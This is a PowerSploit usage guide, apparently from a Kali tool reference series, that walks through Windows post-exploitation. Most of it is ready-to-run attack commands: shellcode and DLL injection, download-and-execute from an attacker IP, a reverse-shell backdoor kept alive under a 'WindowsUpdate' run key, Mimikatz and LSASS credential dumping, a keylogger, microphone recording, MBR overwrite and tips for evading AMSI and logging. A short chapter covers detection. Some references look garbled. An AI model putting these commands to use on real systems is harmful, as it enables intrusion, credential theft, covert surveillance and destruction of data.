---
tool_name: "powersploit"
display_name: "PowerSploit"
mitre_tactic: "execution"
mitre_tactic_id: "TA0002"
mitre_subcategory: "execution"
install_command: "sudo apt install powersploit"
version: "3.0.0"
github_repo: "https://github.com/PowerShellMafia/PowerSploit"
kali_tools_page: "https://www.kali.org/tools/powersploit/"
difficulty_level: "intermediate-to-advanced"
requires_root: false
gui_available: false
tags: ["powershell", "post-exploitation", "red-team", "windows", "privilege-escalation"]
related_tools: ["nishang", "mimikatz", "metasploit-framework"]
---

# PowerSploit — PowerShell Post-Exploitation Framework

## Chapter 1: Introduction & Overview

### What is PowerSploit?

PowerSploit is a collection of Microsoft PowerShell modules designed to aid penetration testers during all phases of an assessment. It provides modules for code execution, script modification, persistence, privilege escalation, reconnaissance, data exfiltration, and antivirus bypass. PowerSploit's modules are widely integrated into other offensive tools including Metasploit Framework, Cobalt Strike, and Empire.

### History & Background

- **Created:** 2012 by Matthew Graeber (@mattifestation)
- **Maintained:** PowerShellMafia (archived January 2021)
- **License:** BSD 3-Clause
- **Language:** PowerShell (96.3%), C++ (3.1%)
- **Current Version:** 3.0.0 (December 2015)
- **GitHub Stars:** 13.1k+

PowerSploit was the first comprehensive PowerShell post-exploitation framework. It established the patterns that later tools (Empire, Covenant) adopted. The project is archived but the code remains functional and is still shipped in Kali Linux. Scripts are used individually or as a module — each can be loaded standalone without the full framework.

### When to Use This Tool

- **Code execution:** Reflective DLL injection, shellcode injection, WMI command execution
- **Privilege escalation:** PowerUp checks for common escalation vectors
- **Persistence:** Add user-level and elevated persistence mechanisms
- **Credential harvesting:** Mimikatz integration, GPP password extraction, token manipulation
- **Reconnaissance:** PowerView for domain enumeration, port scanning
- **Data exfiltration:** Volume shadow copy, minidump, credential extraction
- **AV bypass:** Detect and bypass antivirus signatures

### When NOT to Use This Tool

- Without written authorization from the target system owner
- When PowerShell execution is blocked by WDAC or AppLocker
- On non-Windows systems (PowerShell Core exists but modules target Windows)
- When the target has advanced EDR that monitors PowerShell deeply

### Legal and Ethical Considerations

- **Written authorization** is mandatory before any offensive usage
- **Scope limitations** — PowerSploit modules can cause system instability (Mayhem module)
- **Persistence cleanup** — Always remove persistence mechanisms after testing
- **Privilege escalation** — PowerUp can modify system configurations; understand the impact
- **Memory artifacts** — Reflective loading leaves traces in process memory

### Key Concepts

- **Reflective PE Injection:** Loading DLLs/EXEs directly into the PowerShell process memory without writing to disk
- **PowerUp:** Comprehensive privilege escalation check module
- **PowerView:** Domain enumeration and exploitation framework
- **DLL Injection:** Injecting a DLL into a running process to execute arbitrary code
- **Shellcode Injection:** Injecting raw shellcode into a process for execution
- **Token Manipulation:** Impersonating other users' logon tokens
- **Volume Shadow Copy:** Accessing locked files by reading raw NTFS structures

---

## Chapter 2: Installation & Setup

### System Requirements

- **Attacker:** Kali Linux (for serving payloads and receiving shells)
- **Target:** Windows 7+ with PowerShell v2+ (v3+ recommended)
- **Network:** Attacker reachable from target for reverse shells
- **Disk Space:** 5.46 MB installed
- **Dependencies:** kali-defaults

### Installation Methods

#### Method 1: APT (Recommended on Kali)
```bash
sudo apt update
sudo apt install powersploit
```

#### Method 2: From GitHub
```bash
git clone https://github.com/PowerShellMafia/PowerSploit.git
cd PowerSploit
```

#### Method 3: Manual Download
```powershell
# Download specific module
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1' -OutFile 'Invoke-Shellcode.ps1'
```

### Configuration

**Kali Install Location:**
```
/usr/share/powersploit/
├── AntivirusBypass/
├── CodeExecution/
├── Exfiltration/
├── Mayhem/
├── Persistence/
├── PETools/
├── PowerSploit.psd1
├── PowerSploit.psm1
├── Recon/
├── ReverseEngineering/
├── ScriptModification/
└── Tests/
```

**Windows Module Path (for manual install):**
```
$Env:HomeDrive$Env:HOMEPATH\Documents\WindowsPowerShell\Modules
$Env:windir\System32\WindowsPowerShell\v1.0\Modules
```

### Verification
```powershell
# Import and verify
Import-Module .\PowerSploit.psd1
Get-Command -Module PowerSploit
```

---

## Chapter 3: Basic Usage

### Loading PowerSploit

#### Load as Module
```powershell
PS C:\PowerSploit> Import-Module .\PowerSploit.psd1
PS C:\PowerSploit> Get-Command -Module PowerSploit
```
**Explanation:** Loads all PowerSploit functions into the current session. The module manifest (`.psd1`) defines exported functions.

#### Load Individual Scripts
```powershell
PS C:\PowerSploit> . .\CodeExecution\Invoke-Shellcode.ps1
PS C:\PowerSploit> . .\Privesc\PowerUp.ps1
```
**Explanation:** Dot-sourcing loads individual scripts. Recommended for operational use — loads only what you need.

#### Remove Download Warning (PowerShell v3+)
```powershell
$Env:PSModulePath.Split(';') | % { if ( Test-Path (Join-Path $_ PowerSploit) ) {Get-ChildItem $_ -Recurse | Unblock-File} }
```
**Explanation:** Removes the "downloaded from the Internet" warning for PowerShell v3+ systems.

### Code Execution — First Shell

#### Inject Shellcode into Current Process
```powershell
PS C:\PowerSploit> . .\CodeExecution\Invoke-Shellcode.ps1
PS C:\PowerSploit> Invoke-Shellcode -Shellcode @(0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30)
```
**Explanation:** Injects and executes shellcode within the current PowerShell process. The shellcode must be valid for the target architecture.

#### Download and Execute Shellcode
```powershell
PS C:\PowerSploit> Invoke-Shellcode -Shellcode (New-Object Net.WebClient).DownloadData('http://192.168.1.100:8080/shellcode.bin')
```
**Explanation:** Downloads shellcode from a remote server and executes it in the current process.

#### Inject DLL into Remote Process
```powershell
PS C:\PowerSploit> . .\CodeExecution\Invoke-DllInjection.ps1
PS C:\PowerSploit> Invoke-DllInjection -DllPath C:\temp\payload.dll -ProcessId 1234
```
**Explanation:** Injects a DLL into the specified process ID. Useful for privilege escalation by injecting into a SYSTEM process.

#### Reflective PE Injection
```powershell
PS C:\PowerSploit> . .\CodeExecution\Invoke-ReflectivePEInjection.ps1
PS C:\PowerSploit> Invoke-ReflectivePEInjection -PEPath C:\temp\payload.dll
```
**Explanation:** Loads a PE file (DLL or EXE) reflectively into the PowerShell process without writing to disk. The most powerful execution technique in PowerSploit.

### Privilege Escalation with PowerUp

#### Run All PowerUp Checks
```powershell
PS C:\PowerSploit> . .\Privesc\PowerUp.ps1
PS C:\PowerSploit> Invoke-AllChecks
```
**Explanation:** Runs all PowerUp privilege escalation checks and outputs findings. Identifies service misconfigurations, unquoted paths, writable DLLs, and more.

#### Check Specific Vectors
```powershell
# Unquoted service paths
PS C:\PowerSploit> Get-UnquotedService

# Writable service executables
PS C:\PowerSploit> Get-ModifiableService

# Service binary hijacking
PS C:\PowerSploit> Write-ServiceBinary -Name 'VulnerableService' -Path 'C:\temp\payload.exe'

# DLL hijacking
PS C:\PowerSploit> Find-ProcessDLLHijack
```
**Explanation:** Individual checks target specific privilege escalation vectors. Chain findings into exploitation.

### Reconnaissance with PowerView

#### Domain Enumeration
```powershell
PS C:\PowerSploit> . .\Recon\PowerView.ps1
PS C:\PowerSploit> Get-Domain
PS C:\PowerSploit> Get-DomainController
PS C:\PowerSploit> Get-DomainUser
PS C:\PowerSploit> Get-DomainGroup
PS C:\PowerSploit> Get-DomainComputer
```
**Explanation:** Core PowerView functions for enumerating Active Directory objects — users, groups, computers, and domain controllers.

#### Find Domain Admins
```powershell
PS C:\PowerSploit> Get-DomainGroupMember -Identity "Domain Admins"
PS C:\PowerSploit> Get-DomainUser -AdminCount
```
**Explanation:** Identifies members of high-privileged groups. AdminCount=1 indicates accounts with elevated privileges.

#### SPN Scanning (Kerberoasting Prep)
```powershell
PS C:\PowerSploit> Get-DomainSPN
```
**Explanation:** Enumerates Service Principal Names. Required for Kerberoasting attacks against service accounts.

---

## Chapter 4: Intermediate Usage

### Script Modification — Payload Preparation

#### Encode and Compress Scripts
```powershell
PS C:\PowerSploit> . .\ScriptModification\Out-EncodedCommand.ps1
PS C:\PowerSploit> Out-EncodedCommand -ScriptPath C:\payload.ps1
```
**Explanation:** Compresses, Base64-encodes, and outputs a command line for the `-encodedcommand` parameter. Useful for bypassing command-line logging.

#### Compress to DLL
```powershell
PS C:\PowerSploit> . .\ScriptModification\Out-CompressedDll.ps1
PS C:\PowerSploit> Out-CompressedDll -ScriptPath C:\payload.ps1
```
**Explanation:** Compresses a script and generates code to load it as a managed DLL in memory.

#### Encrypt Scripts
```powershell
PS C:\PowerSploit> . .\ScriptModification\Out-EncryptedScript.ps1
PS C:\PowerSploit> Out-EncryptedScript -ScriptPath C:\payload.ps1 -Password 'P@ssw0rd'
```
**Explanation:** Encrypts a script with a password. The encrypted script can only be decrypted with the correct key.

#### Strip Comments
```powershell
PS C:\PowerSploit> . .\ScriptModification\Remove-Comment.ps1
PS C:\PowerSploit> Remove-Comment -ScriptPath C:\payload.ps1
```
**Explanation:** Removes comments and extra whitespace from scripts. Reduces detection signature size.

### Persistence Mechanisms

#### User-Level Persistence
```powershell
PS C:\PowerSploit> . .\Persistence\Persistence.ps1
PS C:\PowerSploit> $persist = New-UserPersistenceOption -RegistryKeyPath "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ScriptPath "C:\temp\backdoor.ps1"
PS C:\PowerSploit> Add-Persistence -ScriptPath "C:\temp\backdoor.ps1" -UserPersistenceOption $persist -Verbose
```
**Explanation:** Adds user-level persistence via registry run keys, scheduled tasks, or startup folders.

#### Elevated Persistence
```powershell
PS C:\PowerSploit> $persist = New-ElevatedPersistenceOption -RegistryKeyPath "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
PS C:\PowerSploit> Add-Persistence -ScriptPath "C:\temp\backdoor.ps1" -ElevatedPersistenceOption $persist -Verbose
```
**Explanation:** Adds SYSTEM-level persistence. Requires elevated privileges.

#### Install Security Support Provider
```powershell
PS C:\PowerSploit> . .\Persistence\Install-SSP.ps1
PS C:\PowerSploit> Install-SSP -Path C:\temp\mimilib.dll
```
**Explanation:** Installs an SSP DLL that captures plaintext credentials. Requires SYSTEM privileges and a reboot.

### Credential Harvesting

#### Mimikatz Reflection
```powershell
PS C:\PowerSploit> . .\Exfiltration\Invoke-Mimikatz.ps1
PS C:\PowerSploit> Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```
**Explanation:** Reflectively loads Mimikatz 2.0 in memory. Dumps credentials without writing to disk.

#### GPP Password Extraction
```powershell
PS C:\PowerSploit> . .\Exfiltration\Get-GPPPassword.ps1
PS C:\PowerSploit> Get-GPPPassword
```
**Explanation:** Extracts plaintext passwords from Group Policy Preferences XML files stored in SYSVOL.

#### GPP Autologon Extraction
```powershell
PS C:\PowerSploit> . .\Exfiltration\Get-GPPAutologon.ps1
PS C:\PowerSploit> Get-GPPAutologon
```
**Explanation:** Extracts autologon credentials from registry.xml files pushed through Group Policy Preferences.

#### Token Manipulation
```powershell
PS C:\PowerSploit> . .\Exfiltration\Invoke-TokenManipulation.ps1
PS C:\PowerSploit> Invoke-TokenManipulation -Enumerate
```
**Explanation:** Lists available logon tokens and can create processes with other users' tokens. Useful for impersonation.

#### Credential Injection
```powershell
PS C:\PowerSploit> . .\Exfiltration\Invoke-CredentialInjection.ps1
PS C:\PowerSploit> Invoke-CredentialInjection -Username "admin" -Password "P@ssw0rd" -Domain "CORP"
```
**Explanation:** Creates logon sessions with clear-text credentials without triggering Event ID 4648 (Explicit Credential Logon).

#### Volume Shadow Copy
```powershell
PS C:\PowerSploit> . .\Exfiltration\New-VolumeShadowCopy.ps1
PS C:\PowerSploit> New-VolumeShadowCopy -Volume 'C:\'
PS C:\PowerSploit> Get-VolumeShadowCopy
PS C:\PowerSploit> Mount-VolumeShadowCopy -Path 'C:\vss' -DevicePath '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\'
```
**Explanation:** Creates and mounts volume shadow copies to access locked files like NTDS.dit and SAM.

### Reconnaissance

#### Port Scanning
```powershell
PS C:\PowerSploit> . .\Recon\Invoke-Portscan.ps1
PS C:\PowerSploit> Invoke-Portscan -Hosts 192.168.1.0/24 -Ports 21,22,80,445,3389
```
**Explanation:** Simple port scanner using regular sockets. Noisy but functional for internal recon.

#### HTTP Status Enumeration
```powershell
PS C:\PowerSploit> . .\Recon\Get-HttpStatus.ps1
PS C:\PowerSploit> Get-HttpStatus -Target target.example.com -Path C:\wordlists\common.txt
```
**Explanation:** Enumerates web directories by checking HTTP status codes against a wordlist.

#### Reverse DNS Lookup
```powershell
PS C:\PowerSploit> . .\Recon\Invoke-ReverseDnsLookup.ps1
PS C:\PowerSploit> Invoke-ReverseDnsLookup -StartAddress 192.168.1.1 -EndAddress 192.168.1.254
```
**Explanation:** Scans an IP range for DNS PTR records. Identifies hostname-to-IP mappings.

### Data Exfiltration

#### Keylogger
```powershell
PS C:\PowerSploit> . .\Exfiltration\Get-Keystrokes.ps1
PS C:\PowerSploit> Get-Keystrokes -LogPath C:\temp\keylog.txt -WindowEnumeration
```
**Explanation:** Logs keystrokes with timestamps and active window titles.

#### Screenshot Capture
```powershell
PS C:\PowerSploit> . .\Exfiltration\Get-TimedScreenshot.ps1
PS C:\PowerSploit> Get-TimedScreenshot -Path C:\temp\screenshots -Interval 60
```
**Explanation:** Takes screenshots at regular intervals and saves them to a folder.

#### Microphone Recording
```powershell
PS C:\PowerSploit> . .\Exfiltration\Get-MicrophoneAudio.ps1
PS C:\PowerSploit> Get-MicrophoneAudio -Path C:\temp\recording.wav -Duration 30
```
**Explanation:** Records audio from the system microphone for a specified duration.

#### Process Minidump
```powershell
PS C:\PowerSploit> . .\Exfiltration\Out-Minidump.ps1
PS C:\PowerSploit> Out-Minidump -ProcessName lsass
```
**Explanation:** Creates a full-memory minidump of a process. Can be analyzed offline with Mimikatz.

### Antivirus Bypass

#### Find AV Signatures
```powershell
PS C:\PowerSploit> . .\AntivirusBypass\Find-AVSignature.ps1
PS C:\PowerSploit> Find-AVSignature -FileName C:\payload.exe -Interval 50
```
**Explanation:** Locates single-byte AV signatures in a file by binary-searching for the detection point.

---

## Chapter 5: Advanced Usage

### Reflective PE Injection — Deep Dive

#### Load Arbitrary PE Files
```powershell
# Reflectively load a DLL
Invoke-ReflectivePEInjection -PEPath C:\temp\mimikatz.dll -FunctionName "main"

# Reflectively load an EXE
Invoke-ReflectivePEInjection -PEPath C:\temp\payload.exe

# Inject into remote process
Invoke-ReflectivePEInjection -PEPath C:\temp\payload.dll -ProcessId 1234 -ForceASLR
```
**Explanation:** Reflective injection loads PE files directly in memory, bypassing the Windows loader. Supports both DLLs and EXEs.

### WMI Command Execution

#### Execute via WMI
```powershell
PS C:\PowerSploit> . .\CodeExecution\Invoke-WmiCommand.ps1
PS C:\PowerSploit> Invoke-WmiCommand -ComputerName 192.168.1.200 -Credential $cred -ScriptBlock { whoami }
```
**Explanation:** Executes PowerShell ScriptBlocks on remote hosts via WMI. Useful for lateral movement when WinRM is disabled.

### Mayhem Module (Dangerous)

#### Master Boot Record Overwrite
```powershell
PS C:\PowerSploit> . .\Mayhem\Mayhem.ps1
PS C:\PowerSploit> Set-MasterBootRecord -Message "Your system has been compromised"
```
**Explanation:** Overwrites the MBR with a custom message. **Destructive operation** — only use in authorized red team engagements.

#### Critical Process Crash
```powershell
PS C:\PowerSploit> Set-CriticalProcess -ProcessName "powershell"
```
**Explanation:** Causes a blue screen when PowerShell exits. **Destructive** — only use for impact demonstrations.

### PowerView — Advanced Enumeration

#### ACL Enumeration
```powershell
PS C:\PowerSploit> Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
```
**Explanation:** Enumerates access control lists on AD objects. Identifies weak permissions that can be exploited for escalation.

#### GPO Enumeration
```powershell
PS C:\PowerSploit> Get-DomainGPO
PS C:\PowerSploit> Get-DomainGPO -ComputerIdentity 192.168.1.200
```
**Explanation:** Lists Group Policy Objects and which ones apply to specific computers.

#### User Hunting
```powershell
PS C:\PowerSploit> Invoke-UserHunter
```
**Explanation:** Identifies where Domain Admins are logged in. Enables targeted credential theft.

#### Permission Hunting
```powershell
PS C:\PowerSploit> Invoke-ACLHunter
```
**Explanation:** Finds interesting ACL permissions that can be abused for privilege escalation.

### PowerShell Remoting via WMI

#### Execute Commands Remotely
```powershell
# Method 1: Invoke-WmiMethod
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"

# Method 2: Set-WmiInstance
Set-WmiInstance -Class Win32_Process -Arguments @{CommandLine="cmd /c whoami > C:\temp\out.txt"; Name="cmd.exe"}
```
**Explanation:** Uses WMI to create processes on remote hosts. Requires admin credentials.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Initial Post-Exploitation on Compromised Host

**Objective:** After gaining a Meterpreter shell, escalate privileges and harvest credentials.

**Steps:**
```bash
# On Kali, set up web server
cd /usr/share/powersploit && python3 -m http.server 8080
```

```powershell
# On target, download and run PowerUp
PS C:\temp> powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/Privesc/PowerUp.ps1');Invoke-AllChecks"
```

```powershell
# If vulnerable service found, exploit it
PS C:\temp> Write-ServiceBinary -Name 'VulnerableSvc' -Path 'C:\temp\payload.exe'
PS C:\temp> Restart-Service -Name 'VulnerableSvc'
```

**Results:** Gained SYSTEM privileges through service binary hijacking.

### Scenario 2: Domain Enumeration and Lateral Movement

**Objective:** Enumerate the domain, find high-value targets, and move laterally.

**Steps:**
```powershell
# 1. Download PowerView
PS C:\temp> powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/Recon/PowerView.ps1')"

# 2. Enumerate domain
PS C:\temp> Get-Domain
PS C:\temp> Get-DomainController
PS C:\temp> Get-DomainUser | Select Name,AdminCount,ServicePrincipalName
PS C:\temp> Get-DomainGroupMember -Identity "Domain Admins"

# 3. Find logged-in admins
PS C:\temp> Invoke-UserHunter

# 4. Harvest credentials from admin session
PS C:\temp> Invoke-TokenManipulation -Enumerate
```

**Results:** Identified Domain Admins, found where they're logged in, and harvested their tokens.

### Scenario 3: Persistent Access

**Objective:** Establish persistent access that survives reboots.

**Steps:**
```powershell
# 1. Create backdoor script
PS C:\temp> $backdoor = 'IEX(New-Object Net.WebClient).DownloadString("http://192.168.1.100/shell.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 4444'
PS C:\temp> $backdoor | Out-File C:\temp\persist.ps1

# 2. Add registry persistence
PS C:\temp> Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell -ep bypass -file C:\temp\persist.ps1"

# 3. Add scheduled task persistence
PS C:\temp> . .\Persistence\Persistence.ps1
PS C:\temp> $opt = New-UserPersistenceOption -ScheduledTask -TaskName "SystemUpdate"
PS C:\temp> Add-Persistence -ScriptPath C:\temp\persist.ps1 -UserPersistenceOption $opt
```

**Results:** Persistent backdoor that executes on user login and every reboot.

### Scenario 4: Credential Dumping Without Disk Writes

**Objective:** Extract credentials entirely in memory.

**Steps:**
```powershell
# 1. Reflectively load Mimikatz
PS C:\temp> IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/Exfiltration/Invoke-Mimikatz.ps1')

# 2. Dump credentials
PS C:\temp> Invoke-Mimikatz -Command "sekurlsa::logonpasswords"

# 3. Dump SAM hashes
PS C:\temp> Invoke-Mimikatz -Command "lsadump::sam"

# 4. Dump LSASS
PS C:\temp> Out-Minidump -ProcessName lsass -DumpFilePath C:\temp\
```

**Results:** Credentials extracted without writing Mimikatz to disk.

---

## Chapter 7: Detection & Defense

### How Defenders Detect PowerSploit

- **Script Block Logging:** Records deobfuscated PowerShell code (Event ID 4104)
- **Module Logging:** Logs individual module operations (Event ID 4103)
- **AMSI Integration:** Windows 10+ AMSI scans scripts before execution
- **Process Memory Analysis:** Reflective DLLs visible in process memory dumps
- **ETW (Event Tracing for Windows):** Real-time PowerShell monitoring
- **Sysmon:** Monitors file creation, network connections, process creation

### Known Signatures

```
# PowerSploit function names in logs
Invoke-AllChecks
Get-UnquotedService
Write-ServiceBinary
Invoke-Mimikatz
Invoke-ReflectivePEInjection
Invoke-Shellcode
Invoke-DllInjection
Get-Domain
Get-DomainUser
Invoke-UserHunter
Invoke-TokenManipulation

# AMSI detection patterns
PowerSploit
Invoke-AllChecks
Write-ServiceBinary

# Network patterns
# Reflective loading creates unusual memory allocations
# WMI execution creates svchost.exe children
```

### Mitigation Strategies

- **Enable PowerShell logging:** Script Block, Module, and Transcript logging
- **Enable AMSI** on all Windows 10+ systems
- **Use Constrained Language Mode** for non-administrative users
- **Block PowerShell for standard users** via AppLocker or WDAC
- **Monitor for unusual PowerShell process creation**
- **Deploy EDR** with PowerShell-specific monitoring
- **Restrict WMI access** to prevent lateral movement
- **Audit Group Policy Preferences** for cached credentials

### Blue Team Response

- **Event ID 4104** — Full PowerShell code in script block logs
- **Event ID 4103** — Module-level operations
- **Event ID 4688** — Process creation with command-line arguments
- **Sysmon Event ID 1** — Process creation with hashes
- **Sysmon Event ID 7** — Image loaded (reflective DLLs)
- **Sysmon Event ID 8** — CreateRemoteThread (injection indicator)

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "The term 'Invoke-AllChecks' is not recognized"
**Cause:** PowerUp not loaded into current session
**Solution:**
```powershell
. .\Privesc\PowerUp.ps1
Invoke-AllChecks
```

#### Error: "Access Denied" on WMI Execution
**Cause:** Insufficient privileges or WinRM disabled
**Solution:** Verify admin credentials and ensure WMI service is running:
```powershell
Get-Service winmgmt
```

#### Error: "ReflectionTypeLoadException" on Reflective Injection
**Cause:** Architecture mismatch (x86 vs x64)
**Solution:** Ensure the PE file matches the target process architecture.

#### Error: "Could not load file or assembly" on Module Import
**Cause:** PowerShell execution policy blocking the module
**Solution:**
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerSploit.psd1
```

#### Error: AMSI Blocking Script Execution
**Cause:** Windows AMSI identified the script as malicious
**Solution:** Use AMSI bypass techniques before loading PowerSploit scripts.

### Performance Optimization

- **Load individual scripts** instead of the entire module
- **Use WMI over WinRM** when possible (less monitoring)
- **Avoid verbose output** unless debugging
- **Use encoded commands** to minimize command-line logging
- **Process results locally** instead of sending to attacker

### FAQ

**Q: Is PowerSploit still maintained?**
A: The project was archived in January 2021. Scripts remain functional on modern Windows systems but receive no updates.

**Q: How does PowerSploit differ from Nishang?**
A: PowerSploit focuses on modular post-exploitation (code execution, persistence, recon, exfiltration). Nishang provides broader offensive PowerShell scripts including backdoors, shells, and decoy documents. They are complementary.

**Q: Can I use PowerSploit with Metasploit?**
A: Yes. Metasploit has built-in PowerSploit modules that can be loaded via the `powershell` post-exploitation module.

**Q: Does PowerSploit work on PowerShell Core?**
A: Some scripts work on PowerShell Core, but most target Windows PowerShell 5.1 due to .NET Framework dependencies.

**Q: What's the most dangerous module?**
A: Mayhem can overwrite the MBR and cause blue screens. Never use it without explicit authorization and a clear understanding of the impact.

---

## Resources

### Official Documentation
- [GitHub Repository](https://github.com/PowerShellMafia/PowerSploit)
- [Kali Tools Page](https://www.kali.org/tools/powersploit/)
- [PowerSploit Wiki](https://github.com/PowerShellMafia/PowerSploit/wiki)
- [Documentation Site](https://powersploit.readthedocs.io/)

### Tutorials
- [PowerSploit Usage Guide](https://github.com/PowerShellMafia/PowerSploit/blob/master/README.md)
- [PowerUp Deep Dive](https://www.harmj0y.net/blog/powershell/powerup-wheres-the-privilege-escalation/)
- [PowerView Usage](https://www.harmj0y.net/blog/powershell/using-powerview-to-actively-enumerate-a-domain/)

### Books
- "PowerShell for Pentesters" by Nikhil Mittal
- "Black Hat PowerShell" by Donato Campagna
- "Red Team Development and Operations" by Joe Bialek

### Videos
- [PowerSploit Overview by Matt Graeber](https://www.youtube.com/results?search_query=powerploit+matt+graeber)
- [DerbyCon PowerSploit Presentations](https://www.youtube.com/results?search_query=derbycon+powerploit)

### Related Tools
- **Nishang:** Complementary offensive PowerShell framework
- **Empire:** PowerShell/C# post-exploitation with C2
- **Cobalt Strike:** Commercial C2 with PowerSploit integration
- **Metasploit:** Multi-platform exploitation with PowerShell modules

### Practice Resources
- [Hack The Box](https://www.hackthebox.com/) — Windows challenges
- [TryHackMe](https://www.tryhackme.com/) — PowerSploit rooms
- [VulnHub](https://www.vulnhub.com/) — Windows vulnerable VMs
- [PentesterLab](https://pentesterlab.com/) — PowerShell exercises
